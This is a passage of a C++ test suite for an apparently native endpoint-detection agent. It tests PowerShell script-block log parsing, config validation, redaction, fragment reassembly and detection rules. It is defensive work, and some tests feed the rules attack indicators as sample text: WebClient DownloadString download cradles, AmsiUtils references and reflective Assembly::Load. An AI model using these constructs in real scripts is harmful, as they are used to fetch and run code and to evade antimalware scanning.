    WriteTaskSchedulerConfig(R"({"taskscheduler_queue_capacity":8192,"taskscheduler_workers":1,"taskscheduler_max_xml_bytes":262144})");
    Config maximum;
    CHECK(LoadConfigFile("edr-native-taskscheduler-config.json", maximum, error));
    CHECK(maximum.taskSchedulerQueueCapacity == 8192 &&
          maximum.taskSchedulerWorkers == 1 &&
          maximum.taskSchedulerMaxXmlBytes == 262144);
    DeleteFileA("edr-native-taskscheduler-config.json");
}

// ----- PowerShell Operational Log Tests -----

static std::wstring PowerShellXml(unsigned int id, const wchar_t* data,
        const wchar_t* systemTime = L"2026-08-02T03:04:05.7654321Z",
        const wchar_t* processId = L"4321") {
    return L"<Event><System><EventID>" + std::to_wstring(id) +
           L"</EventID><Execution ProcessID='" + processId +
           L"' ThreadID='7'/><Security UserID='S-1-5-21-1001'/>"
           L"<TimeCreated SystemTime='" + systemTime +
           L"'/></System><EventData>" + data + L"</EventData></Event>";
}

static void TestPowerShellParser4104() {
    Event event;
    std::wstring xml = PowerShellXml(4104,
        L"<Data Name='MessageNumber'>1</Data>"
        L"<Data Name='MessageTotal'>1</Data>"
        L"<Data Name='ScriptBlockText'>IEX &quot;safe &amp; test&quot;</Data>"
        L"<Data Name='ScriptBlockId'>block-123</Data>"
        L"<Data Name='Path'>C:\\Scripts\\audit.ps1</Data>");
    CHECK(ParsePowerShellXml(xml, 4096, event));
    CHECK(event.type == EDR_EVT_POWERSHELL_SCRIPT);
    CHECK(event.source == "powershell_log");
    CHECK(event.pid == 4321);
    CHECK(event.fields.at(field::kPid) == "4321");
    CHECK(event.fields.at(field::kType) == "POWERSHELL_SCRIPT");
    CHECK(event.fields.at(field::kOperationType) == "SCRIPT_BLOCK");
    CHECK(event.fields.at(field::kPowerShellEventId) == "4104");
    CHECK(event.fields.at(field::kScriptBlockText) == "IEX \"safe & test\"");
    CHECK(event.fields.at(field::kScriptBlockId) == "block-123");
    CHECK(event.fields.at(field::kScriptPath) == "C:\\Scripts\\audit.ps1");
    CHECK(event.fields.at(field::kScriptMessageNumber) == "1");
    CHECK(event.fields.at(field::kScriptMessageTotal) == "1");
    CHECK(event.fields.at(field::kScriptBlockComplete) == "true");
    CHECK(event.fields.at(field::kScriptBlockTruncated) == "false");
    CHECK(event.fields.at(field::kUserId) == "S-1-5-21-1001");
    CHECK(event.fields.at(field::kTimestampProvenance) ==
          "powershell_system_time");
    CHECK(event.ts100ns != 0);
}

static void TestPowerShellParserBoundsAndInvalid() {
    const wchar_t* fragment =
        L"<Data Name='MessageNumber'>2</Data>"
        L"<Data Name='MessageTotal'>3</Data>"
        L"<Data Name='ScriptBlockText'>ABCDEFGHIJ</Data>"
        L"<Data Name='ScriptBlockId'>multipart</Data>";
    Event event;
    CHECK(ParsePowerShellXml(PowerShellXml(4104, fragment), 5, event));
    CHECK(event.fields.at(field::kScriptBlockText) == "ABCDE");
    CHECK(event.fields.at(field::kScriptBlockComplete) == "false");
    CHECK(event.fields.at(field::kScriptBlockTruncated) == "true");
    CHECK((event.flags & EDR_FLAG_TRUNCATED) != 0);

    Event invalidPid;
    CHECK(ParsePowerShellXml(PowerShellXml(4104, fragment,
        L"bad-time", L"not-a-pid"), 20, invalidPid));
    CHECK(invalidPid.pid == 0);
    CHECK(invalidPid.fields.find(field::kPid) == invalidPid.fields.end());
    CHECK(invalidPid.fields.at(field::kTimestampProvenance) ==
          "collector_time_fallback");

    Event invalid;
    CHECK(!ParsePowerShellXml(PowerShellXml(4103, fragment), 20, invalid));
    CHECK(!ParsePowerShellXml(PowerShellXml(4104, fragment), 0, invalid));
    for (const wchar_t* data : {
        L"<Data Name='MessageNumber'>0</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>x</Data>",
        L"<Data Name='MessageNumber'>2</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>x</Data>",
        L"<Data Name='MessageNumber'>x</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>x</Data>",
        L"<Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data>"}) {
        CHECK(!ParsePowerShellXml(PowerShellXml(4104, data), 20, invalid));
    }
}

static void WritePowerShellConfig(const char* data) {
    std::ofstream out("edr-native-powershell-config.json", std::ios::binary);
    out << data;
}

static void TestPowerShellConfigStrictAtomic() {
    std::string error;
    WritePowerShellConfig(
        R"({"enable_powershell_log":true,"powershell_queue_capacity":64,"powershell_workers":8,"powershell_max_xml_bytes":4096,"powershell_max_script_chars":1024,"powershell_reassembly":{"enable":true,"max_fragments":2,"max_assembled_bytes":4096,"state_capacity":1,"max_buffered_bytes":1048576,"timeout_seconds":1}})");
    Config config;
    CHECK(LoadConfigFile("edr-native-powershell-config.json", config, error));
    CHECK(config.enablePowerShellLog && config.powerShellQueueCapacity == 64);
    CHECK(config.powerShellWorkers == 8 &&
           config.powerShellMaxXmlBytes == 4096 &&
           config.powerShellMaxScriptChars == 1024);
    CHECK(config.powerShellReassemblyEnable && config.powerShellReassemblyMaxFragments == 2 &&
          config.powerShellReassemblyMaxAssembledBytes == 4096 && config.powerShellReassemblyStateCapacity == 1 &&
          config.powerShellReassemblyMaxBufferedBytes == 1048576 && config.powerShellReassemblyTimeoutSeconds == 1);

    for (const char* value : {
        R"({"enable_powershell_log":"true"})",
        R"({"powershell_queue_capacity":63})",
        R"({"powershell_queue_capacity":8193})",
        R"({"powershell_workers":0})",
        R"({"powershell_workers":9})",
        R"({"powershell_max_xml_bytes":4095})",
        R"({"powershell_max_xml_bytes":2097153})",
        R"({"powershell_max_script_chars":1023})",
        R"({"powershell_max_script_chars":1048577})",
        R"({"powershell_reassembly":{"max_fragments":1}})",
        R"({"powershell_reassembly":{"max_assembled_bytes":4095}})",
        R"({"powershell_reassembly":{"state_capacity":0}})",
        R"({"powershell_reassembly":{"max_buffered_bytes":1048575}})",
        R"({"powershell_reassembly":{"timeout_seconds":0}})",
        R"({"powershell_reassembly":{"max_assembled_bytes":8192,"max_buffered_bytes":4096}})",
        R"({"powershell_reassembly":{"unknown":1}})",
        R"({"enable_powershell_log":true,"enable_powershell_log":false})"}) {
        WritePowerShellConfig(value);
        Config unchanged;
        unchanged.powerShellWorkers = 7;
        CHECK(!LoadConfigFile("edr-native-powershell-config.json",
                              unchanged, error));
        CHECK(!unchanged.enablePowerShellLog &&
              unchanged.powerShellWorkers == 7);
    }
    WritePowerShellConfig(
        R"({"powershell_queue_capacity":8192,"powershell_workers":1,"powershell_max_xml_bytes":2097152,"powershell_max_script_chars":1048576})");
    Config maximum;
    CHECK(LoadConfigFile("edr-native-powershell-config.json", maximum, error));
    CHECK(maximum.powerShellQueueCapacity == 8192 &&
          maximum.powerShellWorkers == 1 &&
          maximum.powerShellMaxXmlBytes == 2097152 &&
          maximum.powerShellMaxScriptChars == 1048576);
    DeleteFileA("edr-native-powershell-config.json");
}

static void TestPowerShellRedaction() {
    Event event;
    event.type = EDR_EVT_POWERSHELL_SCRIPT;
    event.fields[field::kType] = "POWERSHELL_SCRIPT";
    event.fields[field::kScriptBlockText] = "top-secret-script-body";
    std::string redactedEvent = EventToJsonLine(event, true);
    CHECK(redactedEvent.find("top-secret-script-body") == std::string::npos);
    CHECK(redactedEvent.find("[redacted]") != std::string::npos);
    CHECK(EventToJsonLine(event, false).find("top-secret-script-body") !=
          std::string::npos);
    Event other = event;
    other.fields[field::kScriptBlockText] = "different-script-body";
    auto fingerprint = [](const std::string& line) {
        return line.substr(0, line.find(",\"type\""));
    };
    CHECK(fingerprint(redactedEvent) ==
          fingerprint(EventToJsonLine(other, true)));
    CHECK(fingerprint(EventToJsonLine(event, false)) !=
          fingerprint(EventToJsonLine(other, false)));

    Alert alert{"EDR-TEST", "high", "alert", &event};
    std::string redactedAlert = AlertToJsonLine(alert, true);
    CHECK(redactedAlert.find("top-secret-script-body") == std::string::npos);
    CHECK(redactedAlert.find("[redacted]") != std::string::npos);
}

static void TestPowerShellProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback(
        [&](const Alert& alert) { hits.push_back(alert.ruleId); });
    Event event;
    event.type = EDR_EVT_POWERSHELL_SCRIPT;
    event.fields[field::kType] = "POWERSHELL_SCRIPT";
    auto run = [&](const char* script) {
        hits.clear();
        event.fields[field::kScriptBlockText] = script;
        engine.OnEvent(event);
    };
    run("Net.WebClient Download" "String");
    CHECK(std::find(hits.begin(), hits.end(), "EDR-049") != hits.end());
    run("System.Management.Automation.Amsi" "Utils");
    CHECK(std::find(hits.begin(), hits.end(), "EDR-050") != hits.end());
    run("System.Reflection." "Assembly]::Load(decoded)");
    CHECK(std::find(hits.begin(), hits.end(), "EDR-051") != hits.end());
    run("Get-Process | Sort-Object CPU");
    CHECK(hits.empty());
}

static Event PowerShellFragment(uint32_t index, uint32_t total,
                               const std::string& text,
                               const std::string& block = "block") {
    Event event;
    event.type = EDR_EVT_POWERSHELL_SCRIPT;
    event.source = "powershell_log";
    event.pid = 42;
    event.ts100ns = index * 100;
    event.fields[field::kType] = "POWERSHELL_SCRIPT";
    event.fields[field::kSource] = event.source;
    event.fields[field::kUserId] = "S-1-5-21-test";
    event.fields[field::kScriptBlockId] = block;
    event.fields[field::kScriptMessageNumber] = std::to_string(index);
    event.fields[field::kScriptMessageTotal] = std::to_string(total);
    event.fields[field::kScriptBlockText] = text;
    event.fields[field::kScriptBlockTruncated] = "false";
    return event;
}

class PowerShellTestSink final : public ISink {
public:
    void OnEvent(const Event& event) override {
        std::lock_guard<std::mutex> lock(m_mutex);
        m_events.push_back(event);
    }

    std::vector<Event> Events() {
        std::lock_guard<std::mutex> lock(m_mutex);
        return m_events;
    }

private:
    std::mutex m_mutex;
    std::vector<Event> m_events;
};

static void TestPowerShellReassembly() {
    // Given: an enabled reassembler and fragments arriving out of order.
    PowerShellReassemblyConfig config;
    config.enabled = true;
    uint64_t now = 0;
    PowerShellReassembler reassembler(config, [&] { return now; });
    // When: the final missing fragment arrives.
    auto first = reassembler.Accept(PowerShellFragment(2, 2, "world"));
    auto second = reassembler.Accept(PowerShellFragment(1, 2, "hello "));
    // Then: originals precede a complete ordered derived event.
    CHECK(first.size() == 1 && first[0].disposition == EventDisposition::ReportOnly);
    CHECK(second.size() == 2);
    CHECK(second[0].disposition == EventDisposition::ReportOnly);
    CHECK(second[1].fields.at(field::kScriptBlockText) == "hello world");
    CHECK(second[1].fields.at(field::kScriptBlockComplete) == "true");
    CHECK(second[1].fields.at(field::kScriptReassemblyStatus) == "complete");
    CHECK(second[1].fields.at(field::kScriptReassemblyReason).empty());
    CHECK(second[1].fields.at(field::kScriptReassemblyCount) == "2");
    CHECK(second[1].ts100ns == 100);

    // Given: a duplicate after completion and an unseen late index.
    // When: both arrive before tombstone expiry.
    auto duplicate = reassembler.Accept(PowerShellFragment(1, 2, "hello "));
    auto unseen = reassembler.Accept(PowerShellFragment(3, 3, "new"));
    // Then: exact replay is suppressed, while an unseen late index fails open
    // through one derived event without evaluating the raw fragment twice.
    CHECK(duplicate.size() == 1 && duplicate[0].disposition == EventDisposition::ReportOnly);
    CHECK(unseen.size() == 2);
    CHECK(unseen[0].disposition == EventDisposition::ReportOnly);
    CHECK(unseen[1].disposition == EventDisposition::ReportAndEvaluate);
    CHECK(unseen[1].fields.at(field::kScriptReassemblyReason) ==
          "tombstone_mismatch");

    // Given: missing identity, one-part, and out-of-policy fragments.
    Event missing = PowerShellFragment(1, 2, "x", "missing");
    missing.fields.erase(field::kUserId);
    auto single = reassembler.Accept(PowerShellFragment(1, 1, "x", "single"));
    auto outOfPolicy = reassembler.Accept(PowerShellFragment(1, 65, "x", "many"));
    // When: they enter the reassembler.
    auto missingBatch = reassembler.Accept(std::move(missing));
    // Then: they remain available to normal reporting and rule evaluation.
    CHECK(single.size() == 1 && single[0].disposition == EventDisposition::ReportAndEvaluate);
    CHECK(outOfPolicy.size() == 1 && outOfPolicy[0].disposition == EventDisposition::ReportAndEvaluate);
    CHECK(missingBatch.size() == 1 && missingBatch[0].disposition == EventDisposition::ReportAndEvaluate);
}

static void TestPowerShellReassemblyFailOpenAndBounds() {
    // Given: a bounded block with injected monotonic time.
    PowerShellReassemblyConfig config;
    config.enabled = true;
    config.maxAssembledBytes = 4;
    config.timeoutSeconds = 1;
    uint64_t now = 0;
    PowerShellReassembler reassembler(config, [&] { return now; });
    // When: a block overflows and another expires without new input.
    auto overflow = reassembler.Accept(PowerShellFragment(1, 2, "abc"));
    overflow = reassembler.Accept(PowerShellFragment(2, 2, "def"));
    auto waiting = reassembler.Accept(PowerShellFragment(1, 2, "a", "timeout"));
    now = 2;
    auto expired = reassembler.FlushExpired();
    // Then: each fail-open output is incomplete and routing remains evaluable.
    CHECK(overflow.size() == 2 && overflow[1].fields.at(field::kScriptBlockComplete) == "false");
    CHECK(overflow[1].fields.at(field::kScriptReassemblyReason) == "assembled_bytes_exceeded");
    CHECK(waiting[0].disposition == EventDisposition::ReportOnly);
    CHECK(expired.size() == 1 && expired[0].fields.at(field::kScriptReassemblyReason) == "timeout");
    CHECK(expired[0].disposition == EventDisposition::ReportAndEvaluate);

    // Given: only the second fragment is available.
    PowerShellReassemblyConfig leadingGapConfig;
    leadingGapConfig.enabled = true;
    leadingGapConfig.maxAssembledBytes = 4096;
    leadingGapConfig.maxBufferedBytes = 1024 * 1024;
    leadingGapConfig.timeoutSeconds = 1;
    uint64_t leadingGapNow = 0;
    PowerShellReassembler leadingGap(leadingGapConfig, [&] { return leadingGapNow; });
    auto secondOnly = leadingGap.Accept(PowerShellFragment(2, 2, "tail", "leading-gap"));
    leadingGapNow = 2;
    auto leadingGapExpired = leadingGap.FlushExpired();
    // When: timeout emits the incomplete derived event.
    // Then: the missing leading index has a newline placeholder.
    CHECK(secondOnly.size() == 1 && leadingGapExpired.size() == 1);
    CHECK(leadingGapExpired[0].fields.at(field::kScriptBlockText) == "\ntail");
}

static void TestPowerShellReassemblyConflictsAndEviction() {
    // Given: active blocks that conflict, exceed a global budget, or are flushed.
    uint64_t now = 0;
    PowerShellReassemblyConfig config;
    config.enabled = true;
    config.stateCapacity = 1;
    config.maxAssembledBytes = 8;
    config.maxBufferedBytes = 8;
    PowerShellReassembler reassembler(config, [&] { return now; });
    auto first = reassembler.Accept(PowerShellFragment(1, 2, "ab", "conflict"));
    auto conflict = PowerShellFragment(1, 2, "cd", "conflict");
    auto conflictingPayload = reassembler.Accept(std::move(conflict));
    auto metadataFirst = reassembler.Accept(PowerShellFragment(1, 2, "ab", "metadata"));
    Event metadataConflict = PowerShellFragment(2, 2, "cd", "metadata");
    metadataConflict.fields[field::kScriptPath] = "C:\\different.ps1";
    auto conflictingMetadata = reassembler.Accept(std::move(metadataConflict));
    auto capacityFirst = reassembler.Accept(PowerShellFragment(1, 2, "ab", "capacity-first"));
    auto capacity = reassembler.Accept(PowerShellFragment(1, 2, "ab", "capacity"));
    PowerShellReassemblyConfig globalConfig = config;
    globalConfig.stateCapacity = 4;
    globalConfig.maxBufferedBytes = 8;
    CHECK(globalConfig.maxBufferedBytes >= globalConfig.maxAssembledBytes);
    PowerShellReassembler globalReassembler(globalConfig, [&] { return now; });
    auto globalFirst = globalReassembler.Accept(PowerShellFragment(1, 2, "abcd", "zz-old"));
    auto global = globalReassembler.Accept(PowerShellFragment(1, 2, "abcde", "aa-current"));
    auto shutdown = globalReassembler.FlushAll();
    // When: each terminal path fires.
    // Then: current originals precede one incomplete fail-open derived event.
    CHECK(first.size() == 1 && first[0].disposition == EventDisposition::ReportOnly);
    CHECK(conflictingPayload.size() == 2 && conflictingPayload[0].disposition == EventDisposition::ReportOnly);
    CHECK(conflictingPayload[1].fields.at(field::kScriptReassemblyReason) == "payload_conflict");
    CHECK(metadataFirst.size() == 1 && conflictingMetadata.size() == 2);
    CHECK(conflictingMetadata[1].fields.at(field::kScriptReassemblyReason) == "invariant_metadata");
    CHECK(capacityFirst.size() == 1 && capacity.size() == 2 && capacity[1].fields.at(field::kScriptReassemblyReason) == "state_capacity");
    CHECK(globalFirst.size() == 1 && global.size() == 2 && global[1].fields.at(field::kScriptReassemblyReason) == "global_bytes");
    CHECK(shutdown.size() == 1 && shutdown[0].fields.at(field::kScriptReassemblyReason) == "shutdown");
}

static void TestPowerShellReassemblyTruncationRulesAndRedaction() {
    // Given: a fragmented detection and a truncated fragment.
    uint64_t now = 0;
    PowerShellReassemblyConfig config;
    config.enabled = true;
    PowerShellReassembler reassembler(config, [&] { return now; });
    auto part = reassembler.Accept(PowerShellFragment(1, 2, "Net.WebClient ", "rule"));
    auto complete = reassembler.Accept(PowerShellFragment(2, 2, "DownloadString", "rule"));
    Event truncated = PowerShellFragment(1, 2, "partial", "truncated");
    truncated.flags = EDR_FLAG_TRUNCATED;
    auto incomplete = reassembler.Accept(std::move(truncated));
    // When: the completed output reaches rules and serialized surfaces.
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });
    engine.OnEvent(complete[1]);
    auto amsiPart = reassembler.Accept(PowerShellFragment(1, 2, "System.Management.Automation.", "amsi-rule"));
    auto amsiComplete = reassembler.Accept(PowerShellFragment(2, 2, "AmsiUtils", "amsi-rule"));
    engine.OnEvent(amsiComplete[1]);
    auto reflectionPart = reassembler.Accept(PowerShellFragment(1, 2, "System.Reflection.", "reflection-rule"));
    auto reflectionComplete = reassembler.Accept(PowerShellFragment(2, 2, "Assembly]::Load(payload)", "reflection-rule"));
    engine.OnEvent(reflectionComplete[1]);
    const std::string redactedComplete = EventToJsonLine(complete[1], true);
    const std::string redactedIncomplete = EventToJsonLine(incomplete[1], true);
    // Then: split indicator detection works, both outputs redact, and routing stays off wire.
    CHECK(part.size() == 1 && complete.size() == 2);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-049") != hits.end());
    CHECK(amsiPart.size() == 1 && amsiComplete.size() == 2 && std::find(hits.begin(), hits.end(), "EDR-050") != hits.end());
    CHECK(reflectionPart.size() == 1 && reflectionComplete.size() == 2 && std::find(hits.begin(), hits.end(), "EDR-051") != hits.end());
    CHECK(incomplete.size() == 2 && incomplete[1].fields.at(field::kScriptBlockComplete) == "false");
    CHECK(incomplete[1].fields.at(field::kScriptReassemblyReason) == "fragment_truncated");
    CHECK(redactedComplete.find("DownloadString") == std::string::npos && redactedComplete.find("[redacted]") != std::string::npos);
    CHECK(redactedIncomplete.find("partial") == std::string::npos && redactedIncomplete.find("[redacted]") != std::string::npos);
    CHECK(redactedComplete.find("ReportOnly") == std::string::npos && redactedComplete.find("disposition") == std::string::npos);
}

static void TestPowerShellReassemblyUtf8AndReuse() {
    // Given: a byte-bound reassembler and a completed script-block tombstone.
    uint64_t now = 0;
    PowerShellReassemblyConfig config;
    config.enabled = true;
    config.maxAssembledBytes = 4;
    config.timeoutSeconds = 2;
    PowerShellReassembler reassembler(config, [&] { return now; });
    auto utf8 = reassembler.Accept(PowerShellFragment(1, 2, "\xc3\xa9\xc3\xa9", "utf8"));
    auto utf8Overflow = reassembler.Accept(PowerShellFragment(2, 2, "x", "utf8"));
    bool startWasTombstoneDuplicate = true;
    auto start = reassembler.Accept(
        PowerShellFragment(1, 2, "a", "reuse"),
        &startWasTombstoneDuplicate);
    auto finish = reassembler.Accept(PowerShellFragment(2, 2, "b", "reuse"));
    bool lateWasTombstoneDuplicate = false;
    auto late = reassembler.Accept(
        PowerShellFragment(1, 2, "a", "reuse"),
        &lateWasTombstoneDuplicate);
    bool changedWasTombstoneDuplicate = true;
    auto changed = reassembler.Accept(
        PowerShellFragment(1, 2, "changed", "reuse"),
        &changedWasTombstoneDuplicate);
    now = 3;
    auto reused = reassembler.Accept(PowerShellFragment(1, 2, "c", "reuse"));
    // When: UTF-8 reaches the byte bound and the tombstone expires.
    // Then: bytes, not code points, enforce the bound; reuse is allowed only after expiry.
    CHECK(utf8.size() == 1 && utf8[0].disposition == EventDisposition::ReportOnly);
    CHECK(utf8Overflow.size() == 2 && utf8Overflow[1].fields.at(field::kScriptReassemblyReason) == "assembled_bytes_exceeded");
    CHECK(start.size() == 1 && finish.size() == 2);
    CHECK(late.size() == 1 && late[0].disposition == EventDisposition::ReportOnly);
    CHECK(!startWasTombstoneDuplicate && lateWasTombstoneDuplicate);
    CHECK(changed.size() == 2 && !changedWasTombstoneDuplicate &&
          changed[1].fields.at(field::kScriptReassemblyReason) ==
              "tombstone_mismatch");
    CHECK(reused.size() == 1 && reused[0].disposition == EventDisposition::ReportOnly);

    PowerShellReassemblyConfig boundedConfig;
    boundedConfig.enabled = true;
    boundedConfig.maxFragments = 2;
    PowerShellReassembler bounded(boundedConfig, [&] { return now; });
    std::string fragmentKey;
    CHECK(bounded.TryGetFragmentKey(
        PowerShellFragment(1, 2, "a", "bounded-key"), fragmentKey));
    CHECK(!bounded.TryGetFragmentKey(
        PowerShellFragment(1, 3, "a", "bounded-key"), fragmentKey));

    // Given: the SHA-256 provider fails.
    PowerShellReassembler hashFailure(config, [&] { return now; },
        [](const std::string&) { return std::string(); });
    auto hashFailed = hashFailure.Accept(PowerShellFragment(1, 2, "x", "hash-failure"));
    // When: an otherwise valid fragment is accepted.
    // Then: the raw original remains report-only and the derived event evaluates.
    CHECK(hashFailed.size() == 2 && hashFailed[0].disposition == EventDisposition::ReportOnly);
    CHECK(hashFailed[1].disposition == EventDisposition::ReportAndEvaluate);
    CHECK(hashFailed[1].fields.at(field::kScriptReassemblyReason) == "sha256_failed");
}

static void TestPowerShellReassemblyTombstoneAndTerminalContracts() {
    // Given: capacity-one tombstones, a stateful hasher, and bounded failure inputs.
    uint64_t now = 0;
    PowerShellReassemblyConfig config;
    config.enabled = true;
    config.stateCapacity = 1;
    config.maxAssembledBytes = 4;
    config.maxBufferedBytes = 4;
    PowerShellReassembler reassembler(config, [&] { return now; });
    auto zFirst = reassembler.Accept(PowerShellFragment(1, 2, "a", "z"));
    auto zLast = reassembler.Accept(PowerShellFragment(2, 2, "b", "z"));
    auto aFirst = reassembler.Accept(PowerShellFragment(1, 2, "c", "a"));
    auto aLast = reassembler.Accept(PowerShellFragment(2, 2, "d", "a"));
    auto lateA = reassembler.Accept(PowerShellFragment(1, 2, "c", "a"));
    auto oldZFresh = reassembler.Accept(PowerShellFragment(1, 2, "ef", "z"));
    auto afterLateA = reassembler.FlushAll();
    uint32_t hashes = 0;
    PowerShellReassembler stateful(config, [&] { return now; },
        [&hashes](const std::string& text) { return ++hashes <= 2 ? text : std::string(); });
    auto stableFirst = stateful.Accept(PowerShellFragment(1, 2, "x", "stable"));
    auto stableLast = stateful.Accept(PowerShellFragment(2, 2, "y", "stable"));
    Event truncated = PowerShellFragment(1, 2, "12345", "truncated-limit");
    truncated.flags = EDR_FLAG_TRUNCATED;
    auto truncatedOutput = reassembler.Accept(std::move(truncated));
    Event truncatedReplay = PowerShellFragment(1, 2, "12345", "truncated-limit");
    truncatedReplay.flags = EDR_FLAG_TRUNCATED;
    auto truncatedReplayOutput = reassembler.Accept(std::move(truncatedReplay));
    PowerShellReassembler overLimit(config, [&] { return now; });
    Event oversized = PowerShellFragment(1, 2, "12345", "oversized-limit");
    auto oversizedOutput = overLimit.Accept(std::move(oversized));
    auto oversizedReplay = overLimit.Accept(PowerShellFragment(1, 2, "12345", "oversized-limit"));
    PowerShellReassemblyConfig globalConfig;
    globalConfig.enabled = true;
    globalConfig.maxAssembledBytes = 8;
    globalConfig.maxBufferedBytes = 8;
    PowerShellReassembler global(globalConfig, [&] { return now; });
    auto globalFirst = global.Accept(PowerShellFragment(1, 2, "abcdef", "global-first"));
    Event globalTruncated = PowerShellFragment(2, 2, "efgh", "global-current");
    globalTruncated.flags = EDR_FLAG_TRUNCATED;
    auto globalOutput = global.Accept(std::move(globalTruncated));
    PowerShellReassemblyConfig mismatchConfig = config;
    mismatchConfig.stateCapacity = 2;
    PowerShellReassembler mismatch(mismatchConfig, [&] { return now; });
    auto mismatchFirst = mismatch.Accept(PowerShellFragment(1, 2, "a", "mismatch"));
    auto mismatchLast = mismatch.Accept(PowerShellFragment(2, 2, "b", "mismatch"));
    auto unrelated = mismatch.Accept(PowerShellFragment(1, 2, "c", "unrelated"));
    auto mismatchLate = mismatch.Accept(PowerShellFragment(1, 2, "changed", "mismatch"));
    auto unrelatedFlush = mismatch.FlushAll();
    // When: terminal paths produce their bounded fail-open batches.
    // Then: every eligible original is report-only, tombstones evict by age, and stateful hashing never rehashes on tombstoning.
    CHECK(zFirst.size() == 1 && zLast.size() == 2 && aFirst.size() == 1 && aLast.size() == 2);
    CHECK(lateA.size() == 1 && lateA[0].disposition == EventDisposition::ReportOnly);
    CHECK(oldZFresh.size() == 1 && oldZFresh[0].disposition == EventDisposition::ReportOnly);
    CHECK(afterLateA.size() == 1 && afterLateA[0].fields.at(field::kScriptBlockId) == "z");
    CHECK(stableFirst.size() == 1 && stableLast.size() == 2 && hashes == 2);
    CHECK(truncatedOutput.size() == 2 && truncatedOutput[0].disposition == EventDisposition::ReportOnly);
    CHECK(truncatedOutput[1].fields.at(field::kScriptReassemblyReason) == "fragment_truncated");
    CHECK(truncatedOutput[1].fields.at(field::kScriptBlockText).size() <= config.maxAssembledBytes);
    CHECK(truncatedReplayOutput.size() == 1 && truncatedReplayOutput[0].disposition == EventDisposition::ReportOnly);
    CHECK(oversizedOutput.size() == 2 && oversizedOutput[0].disposition == EventDisposition::ReportOnly);
    CHECK(oversizedReplay.size() == 1 && oversizedReplay[0].disposition == EventDisposition::ReportOnly);
    CHECK(globalFirst.size() == 1 && globalOutput.size() == 3 && globalOutput[0].disposition == EventDisposition::ReportOnly);
    CHECK(globalOutput[1].fields.at(field::kScriptReassemblyReason) == "fragment_truncated");
    CHECK(globalOutput[2].fields.at(field::kScriptReassemblyReason) == "global_bytes");
    CHECK(globalOutput[1].fields.at(field::kScriptBlockText).size() <= globalConfig.maxAssembledBytes);
    CHECK(mismatchFirst.size() == 1 && mismatchLast.size() == 2 && unrelated.size() == 1);
    CHECK(mismatchLate.size() == 2 && mismatchLate[0].disposition == EventDisposition::ReportOnly);
    CHECK(mismatchLate[1].fields.at(field::kScriptReassemblyReason) == "tombstone_mismatch");
    CHECK(unrelatedFlush.size() == 1 && unrelatedFlush[0].fields.at(field::kScriptBlockId) == "unrelated");
}

static void TestPowerShellReassemblyConcurrencyAndBus() {
    // Given: fragment 1 is buffered before a barrier releases a finishing accept
    // and a non-expiring flush, while an unrelated call contends on the mutex.
    PowerShellReassemblyConfig config;
    config.enabled = true;
    uint64_t now = 0;
    PowerShellReassembler reassembler(config, [&] { return now; });
    std::vector<Event> output;
    std::mutex outputMutex;
    auto collect = [&](std::vector<Event> batch) {
        std::lock_guard<std::mutex> lock(outputMutex);
        output.insert(output.end(), batch.begin(), batch.end());
    };
    auto preloaded = reassembler.Accept(PowerShellFragment(1, 2, "left", "concurrent"));
    std::mutex barrierMutex;
    std::condition_variable barrierCv;
    uint32_t ready = 0;
    bool release = false;
    auto waitForRelease = [&] {
        std::unique_lock<std::mutex> lock(barrierMutex);
        ++ready;
        // Both the coordinator and workers wait here with different predicates.
        barrierCv.notify_all();
        barrierCv.wait(lock, [&] { return release; });
    };
    std::thread finisher([&] { waitForRelease(); collect(reassembler.Accept(PowerShellFragment(2, 2, "right", "concurrent"))); });
    std::thread expired([&] { waitForRelease(); collect(reassembler.FlushExpired()); });
    std::thread independent([&] { waitForRelease(); collect(reassembler.Accept(PowerShellFragment(1, 1, "single", "independent"))); });
    {
        std::unique_lock<std::mutex> lock(barrierMutex);
        barrierCv.wait(lock, [&] { return ready == 3; });
        release = true;
    }
    barrierCv.notify_all();
    finisher.join(); expired.join(); independent.join();
    size_t concurrentRawCount = 0, completeCount = 0;
    for (const Event& event : output) {
        auto block = event.fields.find(field::kScriptBlockId);
        if (block != event.fields.end() && block->second == "concurrent") {
            if (event.disposition == EventDisposition::ReportOnly) ++concurrentRawCount;
            else if (event.fields.at(field::kScriptReassemblyStatus) == "complete") ++completeCount;
        }
    }
    CHECK(preloaded.size() == 1 && preloaded[0].disposition == EventDisposition::ReportOnly);
    CHECK(concurrentRawCount == 1 && completeCount == 1);
    for (const Event& event : output) {
        if (event.disposition != EventDisposition::ReportOnly)
            CHECK(event.disposition == EventDisposition::ReportAndEvaluate);
    }
    CHECK(reassembler.FlushAll().empty());

    PowerShellTestSink sink;
    EventBus bus(16);
    bus.Start(&sink);
    PowerShellReassembler busReassembler(config, [&] { return now; });
    Event firstEvent = PowerShellFragment(1, 2, "a", "bus");
    firstEvent.processIdentity = "pid@start";
    Event secondEvent = PowerShellFragment(2, 2, "b", "bus");
    secondEvent.processIdentity = "pid@start";
    for (const Event& event : busReassembler.Accept(std::move(firstEvent))) CHECK(bus.Push(event));
    for (const Event& event : busReassembler.Accept(std::move(secondEvent))) CHECK(bus.Push(event));
    bus.Stop();
    const std::vector<Event> events = sink.Events();
    size_t rawBusCount = 0, derivedBusCount = 0;
    for (const Event& event : events) {
        if (event.disposition == EventDisposition::ReportOnly) ++rawBusCount;
        else ++derivedBusCount;
    }
    CHECK(rawBusCount == 2 && derivedBusCount == 1);
}

static void TestLolbinProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });
    auto matches = [&](const char* id, const char* image, const char* command) {
        hits.clear();
        Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[field::kType] = "PROCESS_START";
        event.fields[field::kImage] = image;
        event.fields[field::kCommandLine] = command;
        engine.OnEvent(event);
        return std::find(hits.begin(), hits.end(), id) != hits.end();
    };

